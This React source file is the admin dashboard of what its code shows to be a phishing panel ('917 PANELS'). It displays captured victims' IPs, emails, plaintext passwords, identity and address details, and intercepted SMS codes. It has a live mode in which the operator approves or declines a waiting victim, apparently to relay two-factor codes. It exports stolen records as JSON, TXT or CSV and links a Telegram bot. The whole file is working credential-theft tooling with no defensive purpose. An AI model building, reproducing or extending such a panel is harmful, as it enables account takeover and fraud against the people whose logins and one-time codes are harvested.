import React, { useState, useEffect } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { 
  BarChart, 
  Bar, 
  XAxis, 
  YAxis, 
  CartesianGrid, 
  Tooltip, 
  ResponsiveContainer
} from 'recharts';
import { 
  Users, 
  LogOut, 
  LayoutDashboard, 
  ShieldCheck,
  X,
  Copy,
  Zap,
  Coffee,
  RefreshCcw,
  Activity,
  Monitor,
  Download,
  Terminal,
  FileCode,
  Send
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { ClientStore, ClientData, SystemMode } from '../services/ClientStore';

export default function AdminDashboard() {
  const navigate = useNavigate();
  const [stats, setStats] = useState(ClientStore.getStats());
  const [clients, setClients] = useState(ClientStore.getClients());
  const [selectedClient, setSelectedClient] = useState<ClientData | null>(null);
  const [systemMode, setSystemMode] = useState<SystemMode>(ClientStore.getSystemMode());

  useEffect(() => {
    const fetchData = async () => {
      await ClientStore.fetchClients();
      setStats(ClientStore.getStats());
      setClients(ClientStore.getClients().slice(0, 5));
    };
    fetchData();
    const interval = setInterval(fetchData, 2000);
    return () => clearInterval(interval);
  }, []);

  const handleSignOut = () => {
    localStorage.removeItem('isAdminAuthenticated');
    navigate('/admin');
  };

  const handleReset = async () => {
    if (window.confirm('Möchten Sie wirklich alle Client-Daten unwiderruflich löschen?')) {
      await ClientStore.resetAllClients();
      setStats(ClientStore.getStats());
      setClients([]);
      alert('Alle Daten wurden auf 0 gesetzt.');
    }
  };

  const exportAll = () => {
    const all = ClientStore.getClients();
    const blob = new Blob([JSON.stringify(all, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `917_export_all_${new Date().getTime()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const exportClient = (client: ClientData, format: 'json' | 'txt' | 'csv') => {
    let content = '';
    let fileName = `client_${client.id}`;
    if (format === 'json') {
      content = JSON.stringify(client, null, 2);
      fileName += '.json';
    } else if (format === 'txt') {
      content = `ID: ${client.id}\nIP: ${client.ip}\nEMAIL: ${client.email}\nPASS: ${client.password}\nSMS: ${client.smsCode}\nMODE: ${client.executionMode}`;
      fileName += '.txt';
    } else {
      content = `id,ip,email,password,sms,mode\n${client.id},${client.ip},${client.email},${client.password},${client.smsCode},${client.executionMode}`;
      fileName += '.csv';
    }
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = fileName;
    a.click();
    URL.revokeObjectURL(url);
  };

  const toggleMode = () => {
    const newMode = systemMode === 'AFK' ? 'LIVE' : 'AFK';
    ClientStore.setSystemMode(newMode);
    setSystemMode(newMode);
  };

  const copyToClipboard = (client: ClientData) => {
    const text = JSON.stringify(client, null, 2);
    navigator.clipboard.writeText(text);
  };

  const chartData = [
    { day: 'Mon', count: Math.floor(stats.total * 0.1) },
    { day: 'Tue', count: Math.floor(stats.total * 0.3) },
    { day: 'Wed', count: Math.floor(stats.total * 0.2) },
    { day: 'Thu', count: Math.floor(stats.total * 0.4) },
    { day: 'Today', count: stats.total },
  ];

  return (
    <div className="flex h-screen bg-black text-white font-mono selection:bg-white selection:text-black antialiased">
      {/* Sidebar */}
      <div className="w-64 border-r border-white/5 flex flex-col p-8 h-full shrink-0">
        <div className="mb-16">
          <h1 className="text-xl font-black italic tracking-tighter text-white uppercase">917 PANELS</h1>
          <p className="text-[#333] text-[9px] font-bold uppercase tracking-[0.2em] mt-1">Version 1.0.0</p>
        </div>

        <nav className="flex-grow space-y-12">
          <div>
            <p className="text-[#222] text-[10px] font-bold uppercase tracking-widest mb-6">Main</p>
            <div className="space-y-4">
              <Link to="/admin/dashboard" className="flex items-center gap-3 text-white">
                <LayoutDashboard className="w-4 h-4" />
                <span className="text-xs font-bold uppercase tracking-tight">Dashboard</span>
              </Link>
              <Link to="/admin/clients" className="flex items-center gap-3 text-[#333] hover:text-white transition-colors">
                <Users className="w-4 h-4" />
                <span className="text-xs font-bold uppercase tracking-tight">Clients</span>
              </Link>
              <Link to="/admin/control" className="flex items-center gap-3 text-[#333] hover:text-white transition-colors">
                <Monitor className="w-4 h-4" />
                <span className="text-xs font-bold uppercase tracking-tight">Control</span>
              </Link>
            </div>
          </div>

          <div>
            <p className="text-[#222] text-[10px] font-bold uppercase tracking-widest mb-6">Integrations</p>
            <div className="space-y-4">
              <Link to="/admin/telegram" className="flex items-center gap-3 text-[#333] hover:text-white transition-colors">
                <Send className="w-4 h-4" />
                <span className="text-xs font-bold uppercase tracking-tight">Telegram Bot</span>
              </Link>
            </div>
          </div>
        </nav>

        <div className="pt-8 border-t border-white/5 space-y-6">
          <div>
            <p className="text-[10px] font-bold uppercase tracking-tighter text-white">admin</p>
            <p className="text-[9px] font-bold text-[#222] uppercase tracking-[0.2em] mt-0.5"><ShieldCheck className="w-3 h-3 inline mr-1 text-white/20" /> ADMIN</p>
          </div>
          <button 
            onClick={handleSignOut}
            className="flex items-center gap-2 text-[#333] hover:text-white transition-all text-[10px] uppercase font-bold tracking-widest"
          >
            <LogOut className="w-3 h-3" />
            Sign Out
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 overflow-y-auto p-12">
        <header className="mb-16 flex justify-between items-start">
          <div>
            <h2 className="text-4xl font-black tracking-tighter uppercase leading-none italic">Dashboard</h2>
            <div className="mt-6 flex items-center gap-3">
              <button 
                onClick={toggleMode}
                className={cn(
                  "flex items-center gap-2 px-3 py-1.5 rounded text-[10px] font-bold uppercase tracking-widest border transition-all",
                  systemMode === 'LIVE' ? "bg-white text-black border-white" : "text-[#444] border-white/10 hover:border-white/20"
                )}
              >
                {systemMode === 'LIVE' ? <Zap className="w-3 h-3" /> : <Coffee className="w-3 h-3" />}
                {systemMode}
              </button>
              <button 
                onClick={handleReset}
                className="flex items-center gap-2 px-3 py-1.5 rounded text-[10px] font-bold uppercase tracking-widest bg-red-500/10 text-red-500 border border-red-500/20 hover:bg-red-500/20"
              >
                <RefreshCcw className="w-3 h-3" />
                Reset
              </button>
              <button 
                onClick={exportAll}
                className="flex items-center gap-2 px-3 py-1.5 rounded text-[10px] font-bold uppercase tracking-widest bg-white/5 text-[#444] border border-white/5 hover:border-white/10 hover:text-white"
              >
                <Download className="w-3 h-3" />
                Export All
              </button>
            </div>
          </div>
          <div className="flex flex-col items-end gap-2 text-right">
             <div className="flex items-center gap-2">
                <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse shadow-[0_0_8px_rgba(34,197,94,0.5)]" />
                <span className="text-[9px] font-black uppercase text-green-500 tracking-[0.2em]">Connected</span>
             </div>
            <div className="flex gap-4">
              <div className="bg-white/5 px-4 py-2 border border-white/5 rounded">
                <p className="text-[10px] text-[#444] uppercase font-bold mb-1">Live Conn</p>
                <p className="text-xl font-bold italic tracking-tighter">{stats.connected}</p>
              </div>
              <div className="bg-white/5 px-4 py-2 border border-white/5 rounded">
                <p className="text-[10px] text-[#444] uppercase font-bold mb-1">Captured</p>
                <p className="text-xl font-bold italic tracking-tighter">{stats.total}</p>
              </div>
            </div>
          </div>
        </header>

        {/* Stats Summary */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8 mb-16">
          <div className="border border-white/5 p-8 hover:bg-white/[0.01] transition-colors">
            <p className="text-[#333] text-[9px] font-bold uppercase tracking-widest mb-4 flex items-center gap-2">
              <Users className="w-3 h-3" /> Total Clients
            </p>
            <h3 className="text-5xl font-black tracking-tighter italic">{stats.total}</h3>
          </div>
          <div className="border border-white/5 p-8 hover:bg-white/[0.01] transition-colors">
            <p className="text-[#333] text-[9px] font-bold uppercase tracking-widest mb-4 flex items-center gap-2">
              <Activity className="w-3 h-3" /> Active
            </p>
            <h3 className="text-5xl font-black tracking-tighter italic text-white/40">{stats.connected}</h3>
          </div>
          <div className="border border-white/5 p-8 hover:bg-white/[0.01] transition-colors">
            <p className="text-[#333] text-[9px] font-bold uppercase tracking-widest mb-4 flex items-center gap-2">
              <ShieldCheck className="w-3 h-3" /> Blocked
            </p>
            <h3 className="text-5xl font-black tracking-tighter italic text-red-900">{stats.blocked}</h3>
          </div>
        </div>

        {/* Analytics Chart */}
        <div className="mb-16">
          <p className="text-[10px] font-bold mb-12 uppercase tracking-[0.3em] text-[#222]">Session Analytics</p>
          <div className="h-[250px] w-full border-b border-white/5">
            <ResponsiveContainer width="100%" height="100%">
              <BarChart data={chartData}>
                <CartesianGrid strokeDasharray="3 3" stroke="#0a0a0a" vertical={false} />
                <XAxis 
                  dataKey="day" 
                  stroke="#222" 
                  fontSize={9} 
                  fontWeight={900}
                  tickLine={false} 
                  axisLine={false} 
                  dy={15}
                />
                <YAxis 
                  stroke="#222" 
                  fontSize={9} 
                  fontWeight={900}
                  tickLine={false} 
                  axisLine={false} 
                />
                <Tooltip 
                  cursor={{ fill: '#050505' }}
                  contentStyle={{ backgroundColor: '#000', border: '1px solid #111', fontSize: '9px', fontWeight: 'bold' }}
                />
                <Bar dataKey="count" fill="#fff" barSize={8} radius={[4, 4, 0, 0]} />
              </BarChart>
            </ResponsiveContainer>
          </div>
        </div>

        {/* Latest Clients */}
        <div>
          <div className="flex justify-between items-end mb-8">
            <p className="text-[10px] font-bold uppercase tracking-[0.3em] text-[#222]">Latest Data Stream</p>
            <Link to="/admin/clients" className="text-[9px] font-black uppercase text-[#444] hover:text-white transition-colors tracking-widest border-b border-white/5">History Log</Link>
          </div>
          <div className="space-y-[1px] bg-white/5">
            {clients.length === 0 ? (
              <div className="bg-black p-12 text-center text-[#222] uppercase text-[10px] font-bold italic tracking-widest">Awaiting connections...</div>
            ) : clients.map((client) => (
              <div 
                key={client.id}
                onClick={() => setSelectedClient(client)}
                className="grid grid-cols-[120px_1fr_120px] bg-black hover:bg-white/[0.02] transition-colors p-6 cursor-pointer group border border-white/5"
              >
                <div className="flex items-center">
                  <span className={cn(
                    "w-1.5 h-1.5 rounded-full animate-pulse",
                    client.status === 'ACCEPTED' ? 'bg-green-500' :
                    client.status === 'BLOCKED' ? 'bg-red-500' : 'bg-primary'
                  )} />
                  <span className={`ml-3 text-[10px] font-black uppercase italic ${client.status === 'ACCEPTED' ? 'text-green-500/40' : 'text-[#444]'}`}>{client.status}</span>
                </div>
                <div className="flex items-center gap-12">
                  <span className="text-sm font-bold tracking-tight text-white/90">{client.ip}</span>
                  <span className="text-[9px] text-[#222] font-black uppercase tracking-widest">{client.city}, {client.country}</span>
                </div>
                <div className="text-right text-[9px] text-[#222] font-bold uppercase italic">
                  {client.lastSeen}
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Detailed Modal */}
        <AnimatePresence>
          {selectedClient && (
            <div className="fixed inset-0 z-50 flex items-center justify-center p-12 bg-black/95 backdrop-blur-3xl overflow-y-auto">
              <motion.div 
                initial={{ opacity: 0, scale: 0.98 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.98 }}
                className="w-full max-w-6xl border border-white/10 bg-black p-12 md:p-20 shadow-2xl relative my-auto"
              >
                <div className="absolute top-8 right-8 flex gap-4">
                   <button 
                    onClick={() => {
                       ClientStore.addOrUpdateClient({ 
                         id: selectedClient.id, 
                         processingStatus: selectedClient.processingStatus === 'DONE' ? 'TODO' : 'DONE' 
                       });
                       setSelectedClient(null);
                    }}
                    className={cn(
                      "px-4 py-2 text-[10px] font-black uppercase tracking-widest border transition-all",
                      selectedClient.processingStatus === 'DONE' ? "bg-green-500/20 text-green-500 border-green-500/30" : "bg-white/5 text-white/40 border-white/10"
                    )}
                  >
                    {selectedClient.processingStatus === 'DONE' ? 'Done' : 'Waiting'}
                  </button>
                  <button 
                    onClick={() => setSelectedClient(null)}
                    className="text-[#222] hover:text-white transition-colors"
                  >
                    <X className="w-8 h-8" />
                  </button>
                </div>

                <div className="flex justify-between items-start mb-20">
                  <div>
                    <h3 className="text-5xl font-black tracking-tighter uppercase italic">Extracted Entry</h3>
                    <p className="text-[10px] font-bold text-[#222] uppercase tracking-[0.4em] mt-3">Ref ID: {selectedClient.id}</p>
                  </div>
                  <div className="flex gap-4">
                    <button 
                      onClick={() => exportClient(selectedClient, 'json')}
                      className="flex items-center gap-2 text-[9px] font-black uppercase bg-white/5 hover:bg-white/10 px-4 py-2 border border-white/10 transition-all text-[#444] hover:text-white"
                    >
                      <FileCode className="w-3 h-3" />
                      JSON
                    </button>
                    <button 
                      onClick={() => exportClient(selectedClient, 'txt')}
                      className="flex items-center gap-2 text-[9px] font-black uppercase bg-white/5 hover:bg-white/10 px-4 py-2 border border-white/10 transition-all text-[#444] hover:text-white"
                    >
                      <Terminal className="w-3 h-3" />
                      TXT
                    </button>
                    <button 
                      onClick={() => {
                        const data = JSON.stringify(selectedClient, null, 2);
                        navigator.clipboard.writeText(data);
                        alert('JSON Copied.');
                      }}
                      className="flex items-center gap-3 text-[9px] font-black uppercase bg-white text-black px-6 py-3 border border-white transition-all shadow-[0_0_15px_rgba(255,255,255,0.1)]"
                    >
                      <Copy className="w-4 h-4" />
                      Copy
                    </button>
                  </div>
                </div>

                {/* LIVE Approval Section */}
                {selectedClient.waitingFor !== 'NONE' && (
                  <div className="mb-16 p-8 border border-primary/20 bg-primary/5 rounded flex justify-between items-center animate-pulse">
                    <div>
                       <p className="text-[10px] font-black text-primary uppercase tracking-widest mb-1">Live Connection Waiting</p>
                       <p className="text-xl font-bold italic tracking-tighter uppercase">Client is waiting for {selectedClient.waitingFor} approval</p>
                    </div>
                    <div className="flex gap-4">
                       <button 
                        onClick={async (e) => {
                           e.stopPropagation();
                           await ClientStore.addOrUpdateClient({ id: selectedClient.id, adminDecision: 'FORWARD' });
                           alert('Client wurde freigegeben (FORWARD)');
                           setSelectedClient(null);
                        }}
                        className="px-8 py-3 bg-white text-black font-black uppercase text-[10px] tracking-widest hover:bg-neutral-200 transition-all"
                       >
                         Forward
                       </button>
                       <button 
                         onClick={async (e) => {
                           e.stopPropagation();
                           await ClientStore.addOrUpdateClient({ id: selectedClient.id, adminDecision: 'DECLINE' });
                           alert('Client wurde abgelehnt (DECLINE)');
                           setSelectedClient(null);
                         }}
                         className="px-8 py-3 bg-red-900 text-white font-black uppercase text-[10px] tracking-widest hover:bg-red-800 transition-all"
                       >
                         Decline
                       </button>
                    </div>
                  </div>
                )}

                <div className="grid grid-cols-2 md:grid-cols-4 gap-12 pb-16 border-b border-white/5">
                  <div className="col-span-2 space-y-4">
                     <h5 className="text-[10px] font-black text-[#222] uppercase tracking-widest mb-6 border-b border-white/5 pb-2">Login History</h5>
                     <div className="space-y-4">
                        {selectedClient.loginAttempts?.length > 0 ? selectedClient.loginAttempts.map((att, idx) => (
                           <div key={idx} className="p-4 bg-white/5 border border-white/5 rounded">
                              <p className="text-[9px] font-black text-[#333] mb-2">LOGIN ATTEMPT {idx + 1}</p>
                              <p className="text-xs font-bold text-white mb-1 uppercase italic">{att.email}</p>
                              <p className="text-xs font-black text-primary italic break-all">{att.pass}</p>
                           </div>
                        )) : (
                          <p className="text-[10px] font-bold text-[#222] italic uppercase">No login data yet</p>
                        )}
                     </div>
                  </div>

                  <div className="space-y-10">
                    <div>
                      <h5 className="text-[10px] font-black text-[#222] uppercase tracking-widest mb-3">Identity Snapshot</h5>
                      <div className="space-y-2">
                        <p className="text-[11px] font-bold text-white uppercase">{selectedClient.fullName || '-'}</p>
                        <p className="text-[11px] font-bold text-white opacity-40 italic">{selectedClient.dob || '-'}</p>
                        <p className="text-[11px] font-bold text-white opacity-40">{selectedClient.phone || '-'}</p>
                      </div>
                    </div>
                  </div>
                  <div className="space-y-10">
                    <div>
                      <h5 className="text-[10px] font-black text-[#222] uppercase tracking-widest mb-3">Captured Address</h5>
                      <div className="text-[11px] font-bold text-white italic leading-relaxed opacity-60">
                        {selectedClient.street} {selectedClient.houseNumber}<br/>
                        {selectedClient.zip} {selectedClient.cityForm}
                      </div>
                    </div>
                  </div>
                </div>

                {selectedClient.smsCode && (
                  <div className="mt-12 p-10 bg-white/5 border border-white/10 text-center">
                    <p className="text-[10px] font-black text-white/20 uppercase tracking-[0.5em] mb-4">Captured SMS Payload</p>
                    <p className="text-5xl font-black italic tracking-[0.2em] text-white break-all">
                      {selectedClient.smsCode}
                    </p>
                  </div>
                )}
              </motion.div>
            </div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}

function cn(...classes: any[]) {
  return classes.filter(Boolean).join(' ');
}
